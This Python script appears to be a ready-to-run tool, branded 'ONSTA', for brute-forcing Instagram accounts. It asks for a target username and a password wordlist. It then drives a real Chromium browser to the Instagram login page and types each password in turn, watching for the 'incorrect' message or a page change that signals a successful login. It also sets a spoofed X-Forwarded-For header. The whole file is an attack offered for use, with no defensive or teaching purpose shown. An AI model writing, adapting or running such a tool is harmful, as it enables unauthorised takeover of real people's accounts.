from playwright.sync_api import sync_playwright
from colorama import Fore, Style, init
from pyfiglet import Figlet
import subprocess
import requests
import time

init(autoreset=True)
LOGIN_URL = "https://www.instagram.com/accounts/login"
STATUS = requests.get(LOGIN_URL).status_code
KALI = "p"
lol = "1010101001"

def get_headers():
    headers = {
        'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'accept': "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        'accept-language': "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        'accept-encoding': "gzip, deflate, br, zstd",
        'referer': "https://www.instagram.com/",
        'origin': "https://www.instagram.com",
        'sec-ch-ua-platform': "Windows",
        'sec-fetch-site': "cross-site",
        'cache-control': "no-cache",
        'sec-fetch-dest': "image",
        'sec-ch-ua-mobile': "?0",
        'sec-fetch-mode': "cors",
        'X-Forwarded-For': lol,
        'priority': "u=1, i",
        'pragma': "no-cache"
        
    }
    return headers
time.sleep(1)
r = requests.get(LOGIN_URL, headers=get_headers())

PURPLE = "\033[95m"
PINK = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"
logo = f"""
 ██████╗ ███╗   ██╗███████╗████████╗ █████╗
██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝██╔══██╗
██║   ██║██╔██╗ ██║███████╗   ██║   ███████║
██║   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║
╚██████╔╝██║ ╚████║███████║   ██║   ██║  ██║
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝

{PINK}          I N S T A G R A M{RESET}
"""
print(logo)
USER = input('[+]Enter the Username: ')
WORDLIST = input('[+]Enter the Wordlists Path: ')

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)
    context = browser.new_context()
    page = context.new_page()
    page.goto(LOGIN_URL)
    with open(WORDLIST, "r", encoding="utf-8") as f:
        for i, passwd in enumerate(f, 1):
            passwd = passwd.strip()
            email = page.locator('input[name="email"]')
            password = page.locator('input[name="pass"]')
            email.fill("")
            password.fill("")
            email.type(USER, delay=80)
            password.type(passwd, delay=80)
            start_url = page.url
            page.get_by_role("button", name="Log in").first.click()
            error = page.locator(
                "text=The login information you entered is incorrect."
            )
            try:
                error.wait_for(state="visible", timeout=40000)
                
                print(
                    Fore.YELLOW + f"[{i}] "
                    + Fore.BLUE + "Trying "
                    + Fore.WHITE + "Username: "
                    + Fore.GREEN + USER
                    + Fore.WHITE + " | Password: "
                    + Fore.RED + passwd
                    + Fore.WHITE + " | Status: "
                    + Fore.YELLOW + str(STATUS)
                    + Fore.WHITE + " | apparen: "
                    + Fore.YELLOW + str(KALI)
                    + Fore.BLUE + " => Login Failed "
                )
                
                    
            except:
               
                if page.url != start_url:
                #page.wait_for_url(lambda url: url != start_url, timeout=40000)
                    print(
                    Fore.YELLOW + f"[{i}] "
                    + Fore.GREEN + "Trying "
                    + Fore.WHITE + "Username: "
                    + Fore.GREEN + USER
                    + Fore.WHITE + " | Password: "
                    + Fore.GREEN + passwd
                    + Fore.WHITE + " | Status: "
                    + Fore.YELLOW + str(STATUS)
                    + Fore.WHITE + " | apparen: "
                    + Fore.YELLOW + str(KALI)
                    + Fore.GREEN + " => Login Successfully"
                )
                
                break
    browser.close()
